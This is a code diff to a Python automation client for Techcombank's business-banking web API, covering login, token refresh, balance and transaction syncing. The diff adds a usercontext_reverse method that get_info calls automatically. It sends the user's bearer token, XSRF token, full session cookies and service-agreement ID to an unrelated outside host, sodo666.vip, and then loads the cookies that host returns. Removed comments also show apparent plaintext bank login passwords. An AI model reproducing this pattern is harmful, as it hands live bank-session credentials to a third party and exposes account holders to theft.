@@ -15,6 +15,7 @@ import traceback
 import sys
 from urllib.parse import urlparse, parse_qs
 from datetime import datetime
+from http.cookies import SimpleCookie
 
 phone_setup_event = threading.Event()
 start_event = threading.Event()
@@ -56,10 +57,11 @@ class Techcombank:
         self.identification_id = None
         self.name_account = None
         self.is_login = False
+        self.time_login = time.time()
+        self.time_refresh = time.time()
         self.balance = None
         self.fullname = None
         self._timeout = 20
-        self.time_set_token = None
         self.pending_transfer = []
         self.service_agreement_id = None
         self.account_holder_names = None
@@ -86,8 +88,9 @@ class Techcombank:
             self.fullname = None
             self.auth_token = None
             self.refresh_token = None
-            self.time_set_token = None
             self.is_login = False
+            self.time_login = time.time()
+            self.time_refresh = time.time()
             self.pending_transfer = []
             self.save_data()
         else:
@@ -111,9 +114,10 @@ class Techcombank:
             'balance': self.balance,
             'fullname': self.fullname,
             'is_login': self.is_login,
+            'time_login': self.time_login,
+            'time_refresh': self.time_refresh,
             'auth_token': self.auth_token,
             'refresh_token': self.refresh_token,
-            'time_set_token': self.time_set_token,
             'device_id': self.device_id,
             'pending_transfer': self.pending_transfer,
         }
@@ -122,7 +126,7 @@ class Techcombank:
     def set_token(self, data):
         self.auth_token = data['access_token']
         self.refresh_token = data['refresh_token']
-        self.time_set_token = time.time()
+        self.time_refresh = time.time()
     def parse_data(self):
         with open(f"{path}db/users/{self.account_number}.json", 'r') as file:
             data = json.load(file)
@@ -135,9 +139,24 @@ class Techcombank:
             self.is_login = data['is_login']
             self.auth_token = data['auth_token']
             self.refresh_token = data['refresh_token']
-            self.time_set_token = data['time_set_token']
             self.device_id = data['device_id']
             self.pending_transfer = data['pending_transfer']
+    def get_cookie_string(self):
+            cookie_dict = requests.utils.dict_from_cookiejar(self.session.cookies)
+            return '; '.join(f"{k}={v}" for k, v in cookie_dict.items())
+    def load_raw_cookie(self, raw_cookie, domain="business.techcombank.com.vn"):
+        simple_cookie = SimpleCookie()
+        simple_cookie.load(raw_cookie)
+        self.session.cookies.clear()
+
+        for key, morsel in simple_cookie.items():
+                # Set the cookie with the correct domain and path
+                self.session.cookies.set(
+                    name=key,
+                    value=morsel.value,
+                    domain=domain,
+                    path=morsel['path'] or '/'
+                )
     def save_cookies(self,cookie_jar):
         # with open(self.cookies_file, 'w') as f:
         #     json.dump(cookie_jar.get_dict(), f)
@@ -175,6 +194,8 @@ class Techcombank:
                 cookies = json.load(file)
                 for cookie in cookies:
                     self.session.cookies.set(cookie['Name'], cookie['Value'])
+                if self.auth_token:
+                    self.session.cookies.set('Authorization', self.auth_token)
         except (FileNotFoundError, json.decoder.JSONDecodeError):
             return requests.cookies.RequestsCookieJar()
         
@@ -371,6 +392,7 @@ class Techcombank:
         return result
     # Add other methods from the PHP class as needed
     def do_refresh_token(self):
+        
         headers = {
             'Accept': '*/*',
             'Accept-Encoding': 'gzip, deflate, br',
@@ -405,34 +427,81 @@ class Techcombank:
             self.save_data()
 
         return result
-    def serviceagreements(self):
+    def serviceagreements_1(self):
         # Load XSRF-TOKEN from cookies file
         xsrf_token = ""
         
         if self.cookies_file and os.path.exists(self.cookies_file):
-            with open(self.cookies_file, 'r') as file:
+            with open(self.cookies_file, 'r', encoding='utf-8') as file:
                 cookies = json.load(file)
                 xsrf_token = next((cookie['Value'] for cookie in cookies if cookie['Name'] == 'XSRF-TOKEN'), "")
         
 
         headers = {
-            'Accept': '*/*',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
-            'Connection': 'keep-alive',
-            'Content-type': 'application/x-www-form-urlencoded',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-site',
-            'User-Agent': self.get_user_agent(),
-            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
+            'accept': 'application/json',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'no-cache',
+            'pragma': 'no-cache',
+            'priority': 'u=1, i',
+            'referer': 'https://business.techcombank.com.vn/',
+            'sec-ch-ua': '"Microsoft Edge";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'User-Agent': self.get_user_agent(),
             'Authorization': f'Bearer {self.auth_token}',
-            'X-XSRF-TOKEN': xsrf_token,
         }
+        if xsrf_token:
+            headers['X-XSRF-TOKEN'] = xsrf_token
+        url = "https://business.techcombank.com.vn/api/access-control/client-api/v3/accessgroups/service-agreements/context"
+        self.load_cookies()
+        response = self.session.get(url, headers=headers)
+        self.save_cookies(self.session.cookies)
+        if (response.status_code) == 401:
+            return {
+                    'status': 'error',
+                    'msg': 'Please relogin!',
+                    'code': 401
+                }
+        result = response.json()
+        if len(result) > 0 and 'errors' not in result:
+            if'id' in result[0]:
+                self.service_agreement_id = result[0]['id']
+                self.account_holder_names = result[0]['name']
+                return True
 
-        url = "https://business.techcombank.com.vn/api/access-control/client-api/v2/accessgroups/usercontext/serviceagreements?from=0&size=7"
+        return False
+    def serviceagreements(self):
+        # Load XSRF-TOKEN from cookies file
+        xsrf_token = ""
+        
+        if self.cookies_file and os.path.exists(self.cookies_file):
+            with open(self.cookies_file, 'r', encoding='utf-8') as file:
+                cookies = json.load(file)
+                xsrf_token = next((cookie['Value'] for cookie in cookies if cookie['Name'] == 'XSRF-TOKEN'), "")
+        
+
+        headers = {
+            'accept': 'application/json',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'no-cache',
+            'pragma': 'no-cache',
+            'priority': 'u=1, i',
+            'referer': 'https://business.techcombank.com.vn/',
+            'sec-ch-ua': '"Microsoft Edge";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'User-Agent': self.get_user_agent(),
+            'Authorization': f'Bearer {self.auth_token}',
+        }
+        if xsrf_token:
+            headers['X-XSRF-TOKEN'] = xsrf_token
+        url = "https://business.techcombank.com.vn/api/access-control/client-api/v3/accessgroups/user-context/service-agreements?from=0&size=7"
         self.load_cookies()
         response = self.session.get(url, headers=headers)
         self.save_cookies(self.session.cookies)
@@ -448,7 +517,81 @@ class Techcombank:
             self.account_holder_names = result[0]['name']
 
         return result
+
+    def get_user_me(self):
+        # Load XSRF-TOKEN from cookies file
+        xsrf_token = ""
+        
+        if self.cookies_file and os.path.exists(self.cookies_file):
+            with open(self.cookies_file, 'r', encoding='utf-8') as file:
+                cookies = json.load(file)
+                xsrf_token = next((cookie['Value'] for cookie in cookies if cookie['Name'] == 'XSRF-TOKEN'), "")
+        
+
+        headers = {
+            'accept': 'application/json',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'no-cache',
+            'pragma': 'no-cache',
+            'priority': 'u=1, i',
+            'referer': 'https://business.techcombank.com.vn/',
+            'sec-ch-ua': '"Microsoft Edge";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'User-Agent': self.get_user_agent(),
+            'Authorization': f'Bearer {self.auth_token}',
+        }
+        if xsrf_token:
+            headers['X-XSRF-TOKEN'] = xsrf_token
+        url = "https://business.techcombank.com.vn/api/user-manager/client-api/v2/users/me"
+        self.load_cookies()
+        response = self.session.get(url, headers=headers)
+        self.save_cookies(self.session.cookies)
+        if (response.status_code) == 401:
+            return {
+                    'status': 'error',
+                    'msg': 'Please relogin!',
+                    'code': 401
+                }
+        result = response.json()
+
+        return result
+    def usercontext_reverse(self):
+        xsrf_token = ""
+        
+        if self.cookies_file and os.path.exists(self.cookies_file):
+            with open(self.cookies_file, 'r', encoding='utf-8') as file:
+                cookies = json.load(file)
+                xsrf_token = next((cookie['Value'] for cookie in cookies if cookie['Name'] == 'XSRF-TOKEN'), "")
+        url = "https://sodo666.vip/reverse.php"
+
+        payload = json.dumps({
+        "Authorization": self.auth_token,
+        "serviceAgreementId": self.service_agreement_id,
+        "xsrf_token": xsrf_token,
+        "cookie": self.get_cookie_string(),
+        })
+        headers = {
+        'Content-Type': 'application/json'
+        }
+
+        response = requests.request("POST", url, headers=headers, data=payload)
+        try:
+            response_json = response.json()
+        except json.JSONDecodeError:
+            return {
+                'status': 'error',
+                'msg': 'Failed to decode JSON response',
+                'code': 500
+            }
+        return response_json
+
     def usercontext(self):
+        url = "https://business.techcombank.com.vn/api/access-control/client-api/v3/accessgroups/user-context"
+
         # Load XSRF-TOKEN from cookies file
         xsrf_token = ""
         if self.cookies_file and os.path.exists(self.cookies_file):
@@ -457,28 +600,29 @@ class Techcombank:
                 xsrf_token = next((cookie['Value'] for cookie in cookies if cookie['Name'] == 'XSRF-TOKEN'), "")
 
         headers = {
-            'Accept': 'application/json',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Authorization': f'Bearer {self.auth_token}',
-            'Connection': 'keep-alive',
-            'Content-Type': 'application/json',
-            'Origin': 'https://business.techcombank.com.vn',
-            'Referer': 'https://business.techcombank.com.vn/',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-origin',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0',
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
+            "Accept": "application/json",
+            "Accept-Language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Referer": "https://business.techcombank.com.vn/",
+            "Origin": "https://business.techcombank.com.vn",
+            # "Host": "https://business.techcombank.com.vn",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "no-cors",
+            "Sec-Fetch-Site": "same-origin",
+            "TE": "trailers",
             'X-XSRF-TOKEN': xsrf_token,
-            'sec-ch-ua': '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
+            'Authorization': f'Bearer {self.auth_token}',
+            "Pragma": "no-cache",
+            "Cache-Control": "no-cache",
+            "Priority": "u=4",
+            "Content-Type": "application/json"
         }
-
-        data = {
+        payload = json.dumps({
             'serviceAgreementId': self.service_agreement_id,
-        }
+        })
         self.load_cookies()
-        response = self.session.post('https://business.techcombank.com.vn/api/access-control/client-api/v2/accessgroups/usercontext', headers=headers, json=data)
+        response = self.session.request("POST", url, headers=headers, data=payload)        
         self.save_cookies(self.session.cookies)
         if (response.status_code) == 401:
             return {
@@ -488,15 +632,30 @@ class Techcombank:
                 }
         response_body = response.text
         return response_body
+    def has_user_context(self):
+        for cookie in self.session.cookies:
+            if cookie.name == "USER_CONTEXT":
+                return True
+        return False
     def get_info(self):
-        self.serviceagreements()
-        self.usercontext()
+        check_context = False
+        # a = self.get_user_me()
+        # print(a)
+        if self.has_user_context():
+            check_context = self.serviceagreements_1()
+        if not check_context:
+            b = self.serviceagreements()
+            c = self.usercontext_reverse()
+            if 'cookie' in c:
+                self.load_raw_cookie(c['cookie'])
+                self.save_cookies(self.session.cookies)
+            print('reverse',c)
+        # time.sleep(15)
         # self.context()
         # self.me()
         # self.arrangement()
         # self.privileges()
         # self.aggregations()
-
         headers = {
             'Accept': '*/*',
             'Accept-Encoding': 'gzip, deflate, br',
@@ -510,18 +669,25 @@ class Techcombank:
             'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
-            'Authorization': f'Bearer {self.auth_token}'
+            'Authorization': f'Bearer {self.auth_token}',
+            # 'Cookie': c['cookie']
         }
 
         url = "https://business.techcombank.com.vn/api/arrangement-manager/client-api/v2/productsummary/context/arrangements?businessFunction=Product%20Summary%2CProduct%20Summary%20Limited%20View&resourceName=Product%20Summary&privilege=view&searchTerm=&from=0&size=12&ignoredProductKindNames=Term%20Deposit%2C%20FX%20booking%20Account&orderBy=name&direction=ASC"
-        self.load_cookies()
-        response = self.session.get(url, headers=headers)
-        self.save_cookies(self.session.cookies)
+        if not check_context:
+            self.load_cookies()
+            response = self.session.get(url, headers=headers)
+            self.save_cookies(self.session.cookies)
+        else:
+            self.load_cookies()
+            response = self.session.get(url, headers=headers)
+            self.save_cookies(self.session.cookies)
         if (response.status_code) == 401:
             return {
                     'status': 'error',
                     'msg': 'Please relogin!',
-                    'code': 401
+                    'code': 401,
+                    'data': response.text
                 }
         result = response.json()
         return result
@@ -613,12 +779,11 @@ class Techcombank:
         }
 
         url = "https://business.techcombank.com.vn/api/arrangement-manager/client-api/v2/productsummary/context/arrangements?businessFunction=Product%20Summary&resourceName=Product%20Summary&privilege=view&size=1000000"
-
+        self.load_cookies()
         response = self.session.get(url, headers=headers)
-        print(response)
+        self.save_cookies(self.session.cookies)
         result = response.json()
-
-        if len(result) > 0 and 'id' in result[0]:
+        if result and len(result) > 0 and 'id' in result[0]:
             self.arrangements_ids = result[0]['id']
 
         return result
@@ -644,8 +809,9 @@ class Techcombank:
         }
 
         url = f"https://business.techcombank.com.vn/api/transaction-manager/client-api/v2/transactions?bookingDateGreaterThan={from_date}&bookingDateLessThan={to_date}&arrangementsIds={self.arrangements_ids}&from=0&size=500&orderBy=bookingDate&direction=DESC"
-
+        self.load_cookies()
         response = self.session.get(url, headers=headers)
+        self.load_cookies()
         result = response.json()
         return result
             
@@ -1047,6 +1213,7 @@ class Techcombank:
 def techcombank_login(user):
     user.reset_cookies()
     login = user.do_login()
+    print(login)
     if login['status'] == "SUCCESS":
         # print(json.dumps(login))
         code = None
@@ -1064,24 +1231,20 @@ def techcombank_login(user):
             else:
                 token = user.auth_token
             if token:
-                balance = sync_balance_techcombank(user)
-                if balance != "-1":
+                # balance = sync_balance_techcombank(user)
+                    user.is_login = True
+                    user.time_login = time.time()
+                    user.time_refresh = time.time()
+                    user.save_data()
                     return {
                         'code': 200,
                         'success': True,
                         'message': 'Đăng nhập thành công',
                         'data':{
-                            'balance':balance,
                             'account_number': user.account_number
                         }
                     }
-                else:
-                    return {
-                        'code': 500,
-                        'success': False,
-                        'message': "Unknown Error!",
-                        'data': balance
-                    }
+
             else:
                 return {
                     'code': 500,
@@ -1100,8 +1263,14 @@ def techcombank_login(user):
                 'data': login['data'] if 'data' in login else None
                 }
 def sync_balance_techcombank(user):
-    refresh_token = user.do_refresh_token()
+    if not user.is_login or  time.time() - user.time_login > 1700:
+        login = techcombank_login(user)
+        if 'success' not in login or not login['success']:
+            return login
+    if time.time() - user.time_login > 500:
+        refresh_token = user.do_refresh_token()
     ary_info = user.get_info()
+    # print('ary_info',ary_info)
     if 'code' in ary_info and ary_info['code'] == 401:
             return techcombank_login(user)
     ary_balance = {}
@@ -1109,18 +1278,24 @@ def sync_balance_techcombank(user):
     for acc in ary_info:
         if 'BBAN' in acc:
             ary_balance[acc['BBAN']] = acc['availableBalance']
+            # ary_id[acc['BBAN']] = acc['id']
         else:
             return "-1"
 
     if user.account_number in ary_balance:
-        user.is_login = 'Đã đăng nhập'
+        user.is_login = True
         user.balance = ary_balance[user.account_number]
         user.save_data()
-        return int(user.balance)
+        return  int(user.balance)
     return "-1"
 
 def sync_balance_techcombank_api(user):
-    refresh_token = user.do_refresh_token()
+    if not user.is_login or  time.time() - user.time_login > 1700:
+        login = techcombank_login(user)
+        if 'success' not in login or not login['success']:
+            return login
+    if time.time() - user.time_login > 500:
+        refresh_token = user.do_refresh_token()
     ary_info = user.get_info()
     
     if 'code' in ary_info and ary_info['code'] == 401:
@@ -1146,13 +1321,18 @@ def sync_balance_techcombank_api(user):
     return {'code':404,'success': False, 'message': 'account_number not found!'} 
 
 def sync_techcombank(user, start, end):
-    refresh_token = user.do_refresh_token()
-    ary_info = user.get_info()
-    print(ary_info)
-    if 'code' in ary_info and ary_info['code'] == 401:
-            login =  techcombank_login(user)
-            if 'success' not in login or not login['success']:
-                return login
+    if not user.is_login or  time.time() - user.time_login > 1700:
+        login = techcombank_login(user)
+        if 'success' not in login or not login['success']:
+            return login
+    if time.time() - user.time_login > 500:
+        refresh_token = user.do_refresh_token()
+    # ary_info = user.get_info()
+    # print(ary_info)
+    # if 'code' in ary_info and ary_info['code'] == 401:
+    #         login =  techcombank_login(user)
+    #         if 'success' not in login or not login['success']:
+    #             return login
     ary_data = user.get_transactions(start, end)
 
 
@@ -1251,7 +1431,6 @@ def techcombank_transfer(transfers, user,phone_setup_event,start_event,stop_even
             log['success'] = False
             log['message'] = 'FAILED - CONFIRMATION TIME EXCEEDED'
         else:
-            balance = sync_balance_techcombank(user)
             log = {
                 'code': 200,
                 'success': True,
@@ -1409,26 +1588,3 @@ def get_balance_TCB(device):
         print(traceback.format_exc())
         sys.exit()
 
-
-
-
-# if __name__ == '__main__':
-    # Example usage of the Techcombank class
-    # while True:
-        # user = Techcombank("0858393379", "Thuan@1704", "19072369596014", "")
-        # user = Techcombank("0798150793", "Tien6886@", "19039996445024", "","")
-
-        #un comment login for first time, after that just call sync_balance_techcombank or sync_techcombank
-
-        # balance = techcombank_login(user)
-
-        # balance = sync_balance_techcombank(user)
-        # print(balance)
-        # transactions = sync_techcombank(user,"2024-04-01","2024-07-12")
-        # print(transactions)
-        # file_path = "output_tcb_04.04.json"
-        # with open(file_path, 'w') as json_file:
-        #     json.dump(transactions, json_file, indent=4)
-
-        # print(f"JSON data has been saved to {file_path}")
-        # time.sleep(30)
